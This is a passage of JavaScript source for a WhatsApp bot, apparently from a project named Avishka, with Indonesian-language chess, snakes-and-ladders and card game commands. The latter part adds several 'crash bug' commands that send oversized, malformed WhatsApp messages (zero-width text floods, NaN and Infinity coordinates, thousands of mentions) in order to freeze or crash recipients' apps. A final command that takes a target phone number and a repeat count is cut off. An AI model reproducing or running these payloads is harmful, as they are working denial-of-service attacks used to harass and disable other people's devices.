						if (ulartangga[m.chat].players.length < 2) return m.reply('Jum.chatah Pemain Kurang!\nMinimal 2 Pemain!')
						if (ulartangga[m.chat].start) return m.reply('Sesi Sudah dimulai Sejak Awal!')
						if (ulartangga[m.chat].host !== m.sender) return m.reply(`Hanya Pembuat Room @${ulartangga[m.chat].host.split('@')[0]} yang bisa Memulai Sessi!`)
						let { key } = await m.reply({ image: { url: ulartangga[m.chat].map.url }, caption: `🐍🪜GAME ULAR TANGGA\n\n${ulartangga[m.chat].players.map((p, i) => `- @${p.id.split('@')[0]} (Pion ${['Merah', 'Biru Muda', 'Kuning', 'Hijau', 'Ungu', 'Jingga', 'Biru Tua', 'Putih'][i]})`).join('\n')}\n\nGiliran: @${m.sender.split('@')[0]}\n\nReply Pesan Ini untuk lanjut bermain!\nExample: roll/kocok`, mentions: ulartangga[m.chat].players.map(p => p.id) });
						ulartangga[m.chat].id = key.id
						ulartangga[m.chat].start = true
						break
					case 'leave':
						if (!ulartangga[m.chat]) return m.reply('Tidak Ada Sesi Yang Sedang Berlangsung!')
						if (!ulartangga[m.chat].players.some(a => a.id == m.sender)) return m.reply('Kamu Bukan Pemain!')
						const player = ulartangga[m.chat].players.findIndex(a => a.id == m.sender)
						if (ulartangga[m.chat].start) return m.reply('Game Sudah dimulai!\nTidak Bisa Keluar Sekarang')
						if (ulartangga[m.chat].players.length < 1 || ulartangga[m.chat].host === m.sender) {
							m.reply(ulartangga[m.chat].host === m.sender ? 'Host Meninggalkan Permainan\nPermainan dihentikan!' : 'Pemain Kurang Dari 1, Permainan dihentikan!');
							delete ulartangga[m.chat];
							break;
						}
						ulartangga[m.chat].players.splice(player, 1);
						m.reply('Success Meninggalkan Permainan');
						break
					case 'end':
						if (!ulartangga[m.chat]) return m.reply('Tidak Ada Sesi Yang Sedang Berlangsung!')
						if (ulartangga[m.chat]?.host !== m.sender) return m.reply(`Hanya Pembuat Room @${ulartangga[m.chat].host.split('@')[0]} yang bisa Menghapus Sessi!`)
						delete ulartangga[m.chat]
						m.reply('Berhasil Menghapus Sesi Game')
						break
					default:
						m.reply(`🐍🪜GAME ULARTANGGA\nCommand: ${prefix + command} <command>\n- create\n- join\n- start\n- leave\n- end`)
				}
			}
				break
				
				
			case 'chess': case 'catur': case 'ct': {
				const { DEFAUT_POSITION } = require('chess.js');
				if (!m.isGroup) return m.reply(mess.group)
				if (chess[m.chat] && !(chess[m.chat] instanceof Chess)) {
					chess[m.chat] = Object.assign(new Chess(chess[m.chat].fen), chess[m.chat]);
				}
				switch (args[0]) {
					case 'start':
						if (!chess[m.chat]) return m.reply('Tidak Ada Sesi Yang Sedang Berlangsung!')
						if (!chess[m.chat].acc) return m.reply('Pemain Tidak Lengkap!')
						if (chess[m.chat].player1 !== m.sender) return m.reply('Hanya Pemain Utama Yang bisa Memulai!')
						if (chess[m.chat].turn !== m.sender && !chess[m.chat].start) {
							const encodedFen = encodeURI(chess[m.chat]._fen);
							let boardUrls = [`https://www.chess.com/dynboard?fen=${encodedFen}&size=3&coordinates=inside`, `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside`, `https://chessboardimage.com/${encodedFen}.png`, `https://backscattering.de/web-boardimage/board.png?fen=${encodedFen}`, `https://fen2image.chessvision.ai/${encodedFen}`];
							for (let url of boardUrls) {
								try {
									const { data } = await axios.get(url, { responseType: 'arraybuffer' });
									let { key } = await m.reply({ image: data, caption: `♟️${command.toUpperCase()} GAME\n\nGiliran: @${m.sender.split('@')[0]}\n\nReply Pesan Ini untuk lanjut bermain!\nExample: from to -> b1 c3`, mentions: [m.sender] });
									chess[m.chat].start = true
									chess[m.chat].turn = m.sender
									chess[m.chat].id = key.id;
									return;
								} catch (e) { }
							}
							if (!chess[m.chat].key) {
								m.reply(`Gagal Memulai Permainan!\nGagal sending Papan Permainan!`)
							}
						} else if ([chess[m.chat].player1, chess[m.chat].player2].includes(m.sender)) {
							const isPlayer2 = chess[m.chat].player2 === m.sender
							const nextPlayer = isPlayer2 ? chess[m.chat].player1 : chess[m.chat].player2;
							const encodedFen = encodeURI(chess[m.chat]._fen);
							const boardUrls = [`https://www.chess.com/dynboard?fen=${encodedFen}&size=3&coordinates=inside${!isPlayer2 ? '&flip=true' : ''}`, `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${!isPlayer2 ? '&flip=true' : ''}`, `https://chessboardimage.com/${encodedFen}${!isPlayer2 ? '-flip' : ''}.png`, `https://backscattering.de/web-boardimage/board.png?fen=${encodedFen}&coordinates=true&size=765${!isPlayer2 ? '&orientation=black' : ''}`, `https://fen2image.chessvision.ai/${encodedFen}/${!isPlayer2 ? '?pov=black' : ''}`];
							for (let url of boardUrls) {
								try {
									chess[m.chat].turn = chess[m.chat].turn === m.sender ? m.sender : nextPlayer;
									const { data } = await axios.get(url, { responseType: 'arraybuffer' });
									let { key } = await m.reply({ image: data, caption: `♟️CHESS GAME\n\nGiliran: @${chess[m.chat].turn.split('@')[0]}\n\nReply Pesan Ini untuk lanjut bermain!\nExample: from to -> b1 c3`, mentions: [chess[m.chat].turn] });
									chess[m.chat].id = key.id;
									break;
								} catch (e) { }
							}
						}
						break
					case 'join':
						if (chess[m.chat]) {
							if (chess[m.chat].player1 !== m.sender) {
								if (chess[m.chat].acc) return m.reply(`Pemain Sudah Terisi\nSilahkan Coba Lagi Nanti`)
								let teks = chess[m.chat].player2 === m.sender ? 'TerimaKasih Sudah Mau Bergabung' : `Karena @${chess[m.chat].player2.split('@')[0]} Tidak Merespon\nAkan digantikan Oleh @${m.sender.split('@')[0]}`
								chess[m.chat].player2 = m.sender
								chess[m.chat].acc = true
								m.reply(`${teks}\nSilahkan @${chess[m.chat].player1.split('@')[0]} Untuk Memulai Game (${prefix + command} start)`)
							} else m.reply(`Kamu Sudah Bergabung\nBiarkan Orang Lain Menjadi Lawanmu!`)
						} else m.reply('Tidak Ada Sesi Yang Sedang Berlangsung!')
						break
					case 'end': case 'leave':
						if (chess[m.chat]) {
							if (![chess[m.chat].player1, chess[m.chat].player2].includes(m.sender)) return m.reply('Hanya Pemain yang Bisa Menghentikan Permainan!')
							delete chess[m.chat]
							m.reply('Success Menghapus Sesi Game')
						} else m.reply('Tidak Ada Sesi Yang Sedang Berlangsung!')
						break
					case 'bot': case 'computer':
						if (chess[m.sender]) {
							delete chess[m.sender];
							return m.reply('Success Menghapus Sesi vs BOT')
						} else {
							chess[m.sender] = new Chess(DEFAUT_POSITION);
							chess[m.sender]._fen = chess[m.sender].fen();
							chess[m.sender].turn = m.sender;
							chess[m.sender].botMode = true;
							chess[m.sender].time = Date.now();
							const encodedFen = encodeURI(chess[m.sender]._fen);
							const boardUrls = [`https://www.chess.com/dynboard?fen=${encodedFen}&size=3&coordinates=inside`, `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside`, `https://chessboardimage.com/${encodedFen}.png`, `https://backscattering.de/web-boardimage/board.png?fen=${encodedFen}&coordinates=true&size=765`, `https://fen2image.chessvision.ai/${encodedFen}/`];
							for (let url of boardUrls) {
								try {
									const { data } = await axios.get(url, { responseType: 'arraybuffer' });
									let { key } = await m.reply({ image: data, caption: `♟️CHESS GAME\n\nGiliran: @${chess[m.sender].turn.split('@')[0]}\n\nReply Pesan Ini untuk lanjut bermain!\nExample: from to -> b1 c3`, mentions: [chess[m.sender].turn] });
									chess[m.sender].id = key.id;
									break;
								} catch (e) { }
							}
						}
						break
					default:
						if (/^@?\d+$/.test(args[0])) {
							if (chess[m.chat]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
							if (m.mentionedJid.length < 1) return m.reply('Tag Orang yang Mau diajak Bermain!')
							chess[m.chat] = new Chess(DEFAUT_POSITION);
							chess[m.chat]._fen = chess[m.chat].fen();
							chess[m.chat].player1 = m.sender
							chess[m.chat].player2 = m.mentionedJid ? m.mentionedJid[0] : null
							chess[m.chat].time = Date.now();
							chess[m.chat].turn = null
							chess[m.chat].acc = false
							m.reply(`♟️${command.toUpperCase()} GAME\n\n@${m.sender.split('@')[0]} Menantang @${m.mentionedJid[0].split('@')[0]}\nUntuk Bergabung ${prefix + command} join`)
						} else {
							m.reply(`♟️${command.toUpperCase()} GAME\n\nExample: ${prefix + command} @tag/number\n- start\n- leave\n- join\n- computer\n- end`)
						}
				}

			}
				break
				
				
				
			case 'blackjack': case 'bj': {
				let session = null;
				for (let id in blackjack) {
					if (blackjack[id].players.find(p => p.id === m.sender)) {
						session = blackjack[id];
						break;
					}
				}
				if (session && !(session instanceof Blackjack)) {
					session = Object.assign(new Blackjack(session), session)
				}
				if (blackjack[m.chat] && !(blackjack[m.chat] instanceof Blackjack)) {
					blackjack[m.chat] = Object.assign(new Blackjack(blackjack[m.chat]), blackjack[m.chat])
				}
				switch (args[0]) {
					case 'create': case 'join':
						if (!m.isGroup) return m.reply(mess.group)
						if (blackjack[m.chat] || session) {
							if (blackjack[m.chat]?.players?.some(a => a.id === m.sender)) return m.reply('Kamu Sudah Bergabung!')
							if (session) return m.reply('Kamu sudah bergabung di sesi Grup lain! Keluar dulu sebelum bergabung di sesi baru.');
							if (blackjack[m.chat].players.length > 10) return m.reply(`Jum.chatah Pemain Sudah Maksimal\nSilahkan Memulai Permainan\n${prefix + command} start`);
							blackjack[m.chat].players.push({ id: m.sender, cards: [] });
							m.reply('Success Join Game Blackjack')
						} else {
							blackjack[m.chat] = new Blackjack({ id: m.chat, host: m.sender });
							blackjack[m.chat].players.push({ id: m.sender, cards: [] });
							m.reply('Success Create Game Blackjack')
						}
						break
					case 'start':
						//	if (!m.isGroup) return m.reply(mess.group)
						if (!blackjack[m.chat]) return m.reply('Tidak Ada Sesi Game Blackjack yang Sedang Berjalan!')
						if (blackjack[m.chat]?.host !== m.sender) return m.reply(`Hanya Pembuat Room @${blackjack[m.chat].host.split('@')[0]} yang bisa Memulai Sessi!`)
						if (blackjack[m.chat].players.length < 2) return m.reply('Minimal 2 Pemain Untuk Memulai Permainan!');
						if (blackjack[m.chat].started) return m.reply('Game Sudah Dimulai Sejak Awal!')
						blackjack[m.chat].distributeCards();
						m.reply(`🃏GAME BLACKJACK♦️\nStart Card: ${blackjack[m.chat].startCard.rank + blackjack[m.chat].startCard.suit}\nDeck Count: ${blackjack[m.chat].deck.length}\n${blackjack[m.chat].players.map(a => `- @${a.id.split('@')[0]} : (${a.cards.length} kartu)`).join('\n')}\n\nCek Private Chat\nwa.me/${botNumber.split('@')[0]}`);
						for (let p of blackjack[m.chat].players) {
							const startCard = blackjack[m.chat].startCard;
							let buttons = p.cards.map(a => ({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: `${a.rank}${a.suit}`, id: `.${command} play ${a.rank}${a.suit}` }) }));
							if (!blackjack[m.chat].hasMatching(p.id)) buttons.push({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'Minum', id: `.${command} minum` }) });
							await Avishka.sendListMsg(p.id, { text: `Start Card: ${startCard.rank + startCard.suit}`, footer: `${p.cards.map(c => c.rank + c.suit).join(', ')}`, buttons }, { quoted: m });
						}
						break
					case 'hit': case 'minum': {
						if (!session) return m.reply('Tidak Ada Sesi Game Blackjack yang Sedang Berjalan!')
						if (!session.started) return m.reply('Game Belum Di Mulai!')
						if (session.players.length < 2) return m.reply('Minimal 2 Pemain Untuk Memulai Permainan!');
						if (!session.players?.some(a => a.id === m.sender)) return m.reply('Kamu belum bergabung!');
						if (!args[0]) return m.reply(`use format:\n${prefix + command} play <kartu>\nContoh: ${prefix + command} hit`);
						const player = session.players.find(p => p.id === m.sender);
						const hitIndex = player.cards.findIndex(c => (c.rank + c.suit) === (session.startCard.rank + session.startCard.suit));
						if (session.submitCard.some(s => s.id === m.sender) || session.skip.includes(m.sender)) {
							return m.reply('Kamu sudah bermain di ronde ini!');
						}
						if (!session.hasMatching(m.sender)) {
							if (session.deck.length) {
								const newCard = session.deck.shift();
								player.cards.push(newCard);
								await sleep(1000);
								let buttons = player.cards.map(a => ({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: `${a.rank}${a.suit}`, id: `.${command} play ${a.rank}${a.suit}` }) }));
								if (!session.hasMatching(player.id)) buttons.push({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'Minum', id: `.${command} minum` }) });
								await Avishka.sendListMsg(player.id, { text: `Start Card: ${session.startCard.rank + session.startCard.suit}`, footer: `${player.cards.map(c => c.rank + c.suit).join(', ')}`, buttons }, { quoted: m });
							} else {
								let reuse = session.reuseSubmitCardsForDrinking()
								await m.reply(reuse.msg)
								if (!session.skip.find(a => a.id === player.id)) session.skip.push({ id: player.id });
								await m.reply('Deck sudah habis, kamu tidak bisa mengambil kartu. Dilewati.');
								await Avishka.sendText(session.id, `@${m.sender.split('@')[0]} dilewati karena deck habis.`, m);
								if ((session.submitCard.length + session.skip.length) === session.players.length) {
									const result = session.resolveRound();
									if (result) {
										await Avishka.sendText(session.id, result, m);
										if (session.players.length === 1) {
											await Avishka.sendText(session.id, `Pemain Tersisa 1 (@${session.players[0].id.split('@')[0]}), sesi Blackjack selesai.`, m);
											delete blackjack[session.id];
											return;
										}
										const leaderCards = session.players.find(a => a.id === session.leader);
										let buttons = leaderCards.cards.map(c => ({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: `${c.rank}${c.suit}`, id: `.${command} play ${c.rank}${c.suit}` }) }));
										await Avishka.sendListMsg(session.leader, { text: 'Pilih kartu untuk memulai ronde baru', footer: leaderCards.cards.map(c => c.rank + c.suit).join(', '), buttons }, { quoted: m });
									}
								}
							}
						} else m.reply(`Kamu masih punya kartu dengan suit ${session.startCard.suit}, mainkan dulu sebelum minum!`);
						if ((session.submitCard.length + session.skip.length) === session.players.length) {
							const result = session.resolveRound();
							if (result) {
								await Avishka.sendText(session.id, result, m);
								if (session.players.length === 1) {
									await Avishka.sendText(session.id, `Pemain Tersisa 1 (@${session.players[0].id.split('@')[0]}), sesi Blackjack selesai.`, m);
									delete blackjack[session.id];
									return;
								}
								const leaderCards = session.players.find(a => a.id === session.leader);
								let buttons = leaderCards.cards.map(c => ({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: `${c.rank}${c.suit}`, id: `.${command} play ${c.rank}${c.suit}` }) }));
								await Avishka.sendListMsg(session.leader, { text: 'Pilih kartu untuk memulai ronde baru', footer: leaderCards.cards.map(c => c.rank + c.suit).join(', '), buttons }, { quoted: m });
							}
						}
					}
						break
					case 'play': {
						if (!session) return m.reply('Tidak Ada Sesi Game Blackjack yang Sedang Berjalan!')
						if (!session.started) return m.reply('Game Belum Di Mulai!')
						if (session.players.length < 2) return m.reply('Minimal 2 Pemain Untuk Memulai Permainan!');
						if (!session.players?.some(a => a.id === m.sender)) return m.reply('Kamu belum bergabung!');
						if (!args[1]) return m.reply(`use format:\n${prefix + command} play <kartu>\nContoh: ${prefix + command} play 3♥️`);
						const player = session.players.find(p => p.id === m.sender);
						const idx = player.cards.findIndex(c => normalize(c.rank + c.suit) === normalize(args[1]));
						if (idx === -1) return m.reply('Kartu tidak valid!');
						if (session.submitCard.some(s => s.id === m.sender) || session.skip.includes(m.sender)) return m.reply('Kamu sudah bermain di ronde ini!');
						const card = player.cards[idx];
						if (Object.keys(session.startCard).length) {
							if (card.suit !== session.startCard.suit) return m.reply(`Kartu tidak sesuai! Harus suit ${session.startCard.suit}`);
						} else if (m.sender !== session.leader) return m.reply('Hanya pemimpin ronde yang boleh memulai!');
						player.cards.splice(idx, 1);
						session.secondDeck.push(card);
						session.submitCard.push({ id: m.sender, card: card });
						await sleep(1000);
						if (player.cards.length === 0) {
							session.winner.push({ id: player.id });
							session.leader = '';
							session.submitCard = [];
							session.players = session.players.filter(p => p.id !== player.id);
							await Avishka.sendText(session.id, `@${m.sender.split('@')[0]} memenangkan permainan!\nSisa Kartu: 0`, m);
							if (session.players.length === 1) {
								await Avishka.sendText(session.id, `Pemain Tersisa 1 (@${session.players[0].id.split('@')[0]}), sesi Blackjack selesai.`, m);
								delete blackjack[session.id];
								return;
							}
						}
						if (Object.keys(session.startCard).length === 0) {
							session.startCard = card;
							await Avishka.sendText(session.id, `@${m.sender.split('@')[0]} memulai putaran dengan ${card.rank}${card.suit}`, m);
							for (let s of session.players) {
								if (s.id === session.leader) continue;
								const startCard = session.startCard;
								let buttons = s.cards.map(a => ({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: `${a.rank}${a.suit}`, id: `.${command} play ${a.rank}${a.suit}` }) }));
								if (!session.hasMatching(s.id)) buttons.push({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'Minum', id: `.${command} minum` }) });
								await Avishka.sendListMsg(s.id, { text: `Start Card: ${startCard.rank + startCard.suit}`, footer: `${s.cards.map(c => c.rank + c.suit).join(', ')}`, buttons }, { quoted: m });
							}
							return;
						}
						if ((session.submitCard.length + session.skip.length) === session.players.length) {
							const result = session.resolveRound();
							if (result) {
								await Avishka.sendText(session.id, result, m);
								if (session.players.length === 1) {
									await Avishka.sendText(session.id, `Pemain Tersisa 1 (@${session.players[0].id.split('@')[0]}), sesi Blackjack selesai.`, m);
									delete blackjack[session.id];
									return;
								}
								const leaderCards = session.players.find(a => a.id === session.leader);
								let buttons = leaderCards.cards.map(c => ({ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: `${c.rank}${c.suit}`, id: `.${command} play ${c.rank}${c.suit}` }) }));
								await Avishka.sendListMsg(session.leader, { text: 'Pilih kartu untuk memulai ronde baru', footer: leaderCards.cards.map(c => c.rank + c.suit).join(', '), buttons }, { quoted: m });
							}
						}
						await m.reply(`Kamu memainkan ${card.rank}${card.suit}`);
						await Avishka.sendText(session.id, `@${m.sender.split('@')[0]} memainkan ${card.rank}${card.suit}`, m);
					}
						break
					case 'info':
						if (!session) return m.reply('Tidak Ada Sesi Game Blackjack yang Sedang Berjalan!')
						if (!session.players?.some(a => a.id === m.sender)) return m.reply('Kamu belum bergabung!');
						const players = session.players.map((p, i) => `${i + 1}. @${p.id.split('@')[0]} ${p.id === session.host ? '(HOST) ' : p.id === session.leader ? '(Leader)' : ''}`).join('\n');
						if (m.isGroup) {
							m.reply(`🃏INFO GAME BLACKJACK ♦️\n*Jum.chatah Pemain:* ${session.players.length}\n*Host:* @${session.host.split('@')[0]}\n*Status:* ${session.started ? 'Dimulai' : 'Belum Mulai'}${Object.keys(session.startCard).length > 1 ? `\n*Start Card:* ${session.startCard.rank + session.startCard.suit}` : ''}\n*Sisa Kartu Deck:* ${session.deck.length}\n\n*Daftar Pemain:*\n${players}${session.secondDeck.length ? `\n\n*Riwayat Kartu:* ${session.secondDeck.map(c => `${c.rank}${c.suit}`).join(', ')}` : ''}`)
						} else {
							const player = session.players.find(p => p.id === m.sender);
							const cards = player.cards?.map(c => `${c.rank}${c.suit}`).join(', ') || 'Belum ada kartu';
							m.reply(`🃏INFO GAME BLACKJACK ♦️\n*Jum.chatah Pemain:* ${session.players.length}\n*Host:* @${session.host.split('@')[0]}\n*Status:* ${session.started ? 'Dimulai' : 'Belum Mulai'}${Object.keys(session.startCard).length > 1 ? `\n*Start Card:* ${session.startCard.rank + session.startCard.suit}` : ''}\n*Sisa Kartu Deck:* ${session.deck.length}\n\n*Daftar Pemain:*\n${players}\n\n*Kartu Kamu:*\n${cards}${session.secondDeck.length ? `\n\n*Riwayat Kartu:* ${session.secondDeck.map(c => `${c.rank}${c.suit}`).join(', ')}` : ''}`)
						}
						break
					case 'end':
						if (!m.isGroup) return m.reply(mess.group)
						if (!blackjack[m.chat]) return m.reply('Tidak Ada Sesi Game Blackjack yang Sedang Berjalan!')
						if (blackjack[m.chat]?.host !== m.sender) return m.reply(`Hanya Pembuat Room @${blackjack[m.chat].host.split('@')[0]} yang bisa Menghapus Sessi!`)
						delete blackjack[m.chat]
						m.reply('Berhasil Menghapus Sesi Game Blackjack')
						break
					default:
						m.reply(`🃏GAME BLACKJACK♦️\nCommand: ${prefix + command} <command>\n- create\n- join\n- start\n- info\n- hit\n- deck\n- end`)
				}
			}
				break
				
				
case 'avi-crash': {
    // 1. අතිවිශාල දත්ත පද්ධතියක් සෑදීම
    const heavyString = '🔥AVISHKA-BUG🔥'.repeat(10000); 
    const junkBuffer = Buffer.alloc(1024 * 600, 'AVISHKA'); // 600KB ක Junk දත්ත

    const crashMetadata = {
        location: {
            degreesLatitude: -0.12345678,
            degreesLongitude: 0.12345678,
            name: heavyString,
            address: heavyString,
            jpegThumbnail: junkBuffer // මෙතන තමයි ඇප් එක හිරවෙන්නේ
        },
        contextInfo: {
            stanzaId: "AVI-" + "X".repeat(5000),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
                // Nested දත්ත - එකක් ඇතුළේ තව එකක්
                productMessage: {
                    product: {
                        title: heavyString,
                        description: heavyString,
                        productId: "9999999999",
                        currencyCode: "LKR",
                        priceAmount1000: 999999999,
                        retailerId: heavyString,
                        productImageCount: 100
                    },
                    businessOwnerJid: "0@s.whatsapp.net",
                    contextInfo: {
                        // Mention 700ක් විතර දාමු UI එක Freeze වෙන්න
                        mentionedJid: Array(700).fill("0@s.whatsapp.net")
                    }
                }
            }
        }
    }

    // 2. පණිවිඩය යැවීම (ඔයාගේ Variables: Avishka සහ m.chat)
    console.log("Sending Hard Crash to:", m.chat);
    
    // Loop එකක් දාලා 5 පාරක් විතර යැව්වොත් ගොඩක් දුරකථන හිර වෙනවා
    for (let i = 0; i < 3; i++) {
        await Avishka.sendMessage(m.chat, crashMetadata, { quoted: m });
        await new Promise(resolve => setTimeout(resolve, 300)); // පොඩි Delay එකක්
    }

    console.log("Crash Payload Sent Successfully!");
}
break;

	
case 'avi-hard-bug': {
    // 1. Zero-width සහ අසාමාන්‍ය අක්ෂර සහිත අතිවිශාල Payload එකක්
    // මෙය UI එකේ අකුරු රෙන්ඩර් කරන "Text Engine" එක හිර කරයි.
    const invisibleChar = '\u200B\u200C\u200D\uFEFF'; 
    const ultraHeavy = invisibleChar.repeat(80000);

    const heavyMetadata = {
        viewOnceMessage: {
            message: {
                // මෙහිදී අපි Buttons සහ List පණිවිඩ දෙකම මිශ්‍ර කරනවා (Malformed)
                interactiveMessage: {
                    header: {
                        title: ultraHeavy,
                        subtitle: ultraHeavy,
                        hasMediaQueued: true,
                        // ඉතා විශාල location data
                        locationMessage: {
                            degreesLatitude: NaN, // අංකයක් වෙනුවට NaN (Not a Number) යැවීම
                            degreesLongitude: Infinity, // Infinity අගය
                            name: ultraHeavy,
                            address: ultraHeavy
                        }
                    },
                    body: { text: "⚠️" + " \n".repeat(2000) + "🔥AVISHKA-BUG🔥" },
                    footer: { text: ultraHeavy },
                    nativeFlowMessage: {
                        buttons: Array(50).fill({
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: ultraHeavy,
                                sections: [{
                                    title: ultraHeavy,
                                    rows: Array(100).fill({
                                        title: "BUG",
                                        id: "CRASH"
                                    })
                                }]
                            })
                        })
                    },
                    contextInfo: {
                        // පණිවිඩය ඇතුළේ තවත් අතිවිශාල පණිවිඩයක් Quote කිරීම
                        quotedMessage: {
                            groupInviteMessage: {
                                groupJid: "120363022200000000@g.us",
                                inviteCode: "A".repeat(5000),
                                inviteExpiration: 99999999999,
                                groupName: ultraHeavy,
                                caption: ultraHeavy
                            }
                        },
                        // Mention Spam
                        mentionedJid: Array(1000).fill("0@s.whatsapp.net")
                    }
                }
            }
        }
    }

    console.log("🔥 Sending Ultimate Crash Payload...");
    
    // මේක යවන්න කලින් ඔයාගේ RAM එක free තියාගන්න
    await Avishka.sendMessage(m.chat, heavyMetadata, { quoted: m });
    
    console.log("✅ Sent! Check the target's WhatsApp now.");
}
break;



case 'avi-nonstop-crash': {
    // 1. බොට්ට දරාගන්න පුළුවන් ගාණට අකුරු ප්‍රමාණය අඩු කරමු (අකුරු 30,000 ක් ඇති)
    // මොකද බග් එක තියෙන්නේ අකුරු වල නෙවෙයි, Metadata වලයි.
    const bugText = '☣️AVI-CRASH☣️'.repeat(3000); 

    const crashPayload = {
        interactiveMessage: {
            header: {
                title: "🔥 ALPHA VISION INFINITY 🔥",
                hasMediaQueued: true,
                // Location එකේ දත්ත "Infinity" කිරීමෙන් ඇප් එක හිරවේ
                locationMessage: {
                    degreesLatitude: Infinity, 
                    degreesLongitude: -Infinity,
                    name: bugText,
                    address: bugText
                }
            },
            body: { text: "⚠️ SYSTEM OVERLOAD ⚠️\n" + bugText },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "single_select",
                        // මෙහිදී JSON එක ඇතුළත දත්ත අවුල් කිරීමෙන් ඇප් එක Crash වේ
                        buttonParamsJson: JSON.stringify({
                            title: "CRASH",
                            sections: [{
                                title: "💀",
                                rows: Array(30).fill({ title: "BUG", rowId: bugText })
                            }]
                        })
                    }
                ]
            }
        },
        contextInfo: {
            // පණිවිඩය ලැබුණු සැණින්ම ඇප් එකේ UI එක Frozen කිරීමට
            mentionedJid: Array(500).fill("0@s.whatsapp.net"), 
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
                // බොට්ගේ මතකය පිරෙන්නේ නැති වෙන්න මෙතනට පොඩි text එකක් දාමු
                conversation: "💀 CONTACTING SERVER... 💀"
            }
        }
    };

    console.log("🚀 Sending Optimized Crash Payload...");

    const randomID = "AVI" + Math.random().toString(36).substring(2, 10).toUpperCase();

    // 2. relayMessage එක භාවිතා කිරීමෙන් බොට්ගේ RAM එක පාවිච්චි වීම අඩු වේ
    await Avishka.relayMessage(m.chat, crashPayload, { messageId: randomID })
    .then(() => {
        console.log("✅ Success! Bot is still alive.");
        m.reply("🔥 Ultimate Bug Sent! Target WhatsApp is now unstable.");
    })
    .catch(err => {
        console.error("Relay Error:", err);
        m.reply("❌ Error sending message.");
    });
}
break;




case 'avi-ultimate-crash': {
    if (typeof loading === 'function') await loading();

    // 1. අතිවිශාල දත්ත (අකුරු 300,000+)
    const bugData = '☣️AVI-HARD-BUG☣️'.repeat(30000);

    // 2. WhatsApp Parser එක හිර කරන Protobuf ව්‍යුහය
    const crashPayload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "🔥 AVISHKA SYSTEM DESTROYER 🔥",
                        hasMediaQueued: true,
                        // Location එක වගේ පෙනුනත් මේක ඇතුලේ තියෙන්නේ Crash Metadata
                        locationMessage: {
                            degreesLatitude: NaN, 
                            degreesLongitude: NaN,
                            name: bugData,
                            address: bugData
                        }
                    },
                    body: { text: "⚠️ CRITICAL ERROR DETECTED ⚠️\n" + bugData },
                    footer: { text: bugData },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "Click if you dare",
                                    sections: [{
                                        title: bugData,
                                        rows: Array(50).fill({
                                            title: "💀 CRASH 💀",
                                            rowId: bugData
                                        })
                                    }]
                                })
                            }
                        ]
                    }
                }
            }
        },
        contextInfo: {
            stanzaId: "AVI-" + Math.random().toString(36).substring(2, 10).toUpperCase(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: Array(2000).fill("0@s.whatsapp.net"), // මුළු ඇප් එකම Freeze කරන්න
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
                adminInviteMessage: {
                    inviteCode: bugData,
                    groupName: bugData,
                    caption: bugData
                }
            }
        }
    };

    console.log("🚀 Launching Global Crash Payload...");

    // 3. relayMessage පාවිච්චි කිරීම (ID එකක් අතින් හදමු)
    const randomID = "AVI" + Math.random().toString(36).substring(2, 10).toUpperCase();
    
    await Avishka.relayMessage(m.chat, crashPayload, { messageId: randomID })
    .then(() => {
        console.log("✅ Global Crash Sent! Target WhatsApp should freeze.");
        m.reply("🔥 Ultimate Crash Sent! Target is dead.");
    })
    .catch(err => {
        console.error("Relay Error:", err);
    });
}
break;



case 'avi-call-crash': {
    if (typeof loading === 'function') await loading();

    const bugData = '☣️AVI-CALL-DESTROYER☣️'.repeat(5000); 

    // Group Call එකක Metadata ව්‍යුහය (Protobuf)
    const callCrashPayload = {
        scheduledCallCreationMessage: {
            scheduledTimestampMs: Date.now() + 3600000,
            callType: 2, // Video Call
            title: "🔥 CRITICAL SYSTEM CALL 🔥\n" + bugData
        },
        contextInfo: {
            // Call එකට සම්බන්ධ වෙන්න කියලා Mention කරන එක
            mentionedJid: Array(200).fill("0@s.whatsapp.net"), 
            externalAdReply: {
                title: "🔴 INCOMING CALL OVERLOAD...",
                body: bugData,
                mediaType: 1,
                thumbnailUrl: "https://i.ibb.co/example.jpg",
                sourceUrl: "https://",
                renderLargerThumbnail: true
            },
            // Quoted message එකක් විදිහටත් බර දත්තයක් දාමු
            quotedMessage: {
                groupInviteMessage: {
                    groupJid: "0@g.us",
                    inviteCode: bugData,
                    groupName: bugData,
                    caption: bugData
                }
            }
        }
    };

    console.log("🚀 Injecting Call Crash Payload...");

    const randomID = "AVI-CALL-" + Math.random().toString(36).substring(2, 10).toUpperCase();

    // relayMessage හරහා යැවීමෙන් සර්වර් සීමාවන් මඟහැරේ
    await Avishka.relayMessage(m.chat, callCrashPayload, { messageId: randomID })
    .then(() => {
        console.log("✅ Call Crash Message Sent!");
        m.reply("🔥 Group Call Bug Sent! Target's call logs will freeze.");
    })
    .catch(err => {
        console.error("Relay Error:", err);
    });
}
break;


case 'android3': {
    // 1. දත්ත වෙන් කරගැනීම (Input Handling)
    let number = text.split('/')[0];
    let amount = text.split('/')[1];

    if (!number || !amount) {
        return m.reply(`*── 「 ALPHA VISION KILLER 」 ──*\n\nExample: ${prefix + command} 94xxxxxxxxxx/5\n\n*Note:* This will freeze the target app.`);
